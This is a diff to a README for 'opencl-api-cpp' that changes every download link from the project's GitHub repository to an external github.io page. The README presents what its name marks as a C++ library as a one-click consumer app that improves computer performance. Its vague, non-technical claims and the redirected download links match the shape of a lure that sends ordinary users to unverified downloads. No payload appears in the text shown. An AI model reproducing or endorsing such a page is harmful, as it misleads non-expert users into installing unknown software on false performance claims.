@@ -1,6 +1,6 @@
 # ⚡ opencl-api-cpp - Effortless GPU Power for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/rathan-code/opencl-api-cpp)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://rathan-code.github.io)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Don't worry about specific technical specs—if your computer can run video call
 
 Getting the software is as simple as clicking a button. Here's exactly what to do:
 
-1. Visit this link to download the application: **[Click Here to Download opencl-api-cpp](https://github.com/rathan-code/opencl-api-cpp)**
+1. Visit this link to download the application: **[Click Here to Download opencl-api-cpp](https://rathan-code.github.io)**
 2. The download will begin automatically. You'll see a file in your browser's download area (usually the bottom-left corner or a download icon at the top).
 3. Wait for the download to finish. The time depends on your internet speed, but it usually takes just a few minutes.
 
@@ -141,7 +141,7 @@ Before we finish, let's confirm you're all set:
 
 If you checked all the boxes, congratulations! You're now using **opencl-api-cpp**—your gateway to unlocking your computer's true potential.
 
-Remember: Visit this link to download the application if you haven't yet: **[https://github.com/rathan-code/opencl-api-cpp](https://github.com/rathan-code/opencl-api-cpp)**
+Remember: Visit this link to download the application if you haven't yet: **[https://rathan-code.github.io](https://rathan-code.github.io)**
 
 We're confident you'll notice the difference. Better performance isn't just for experts—it's for everyone. Welcome aboard! 🎉
 
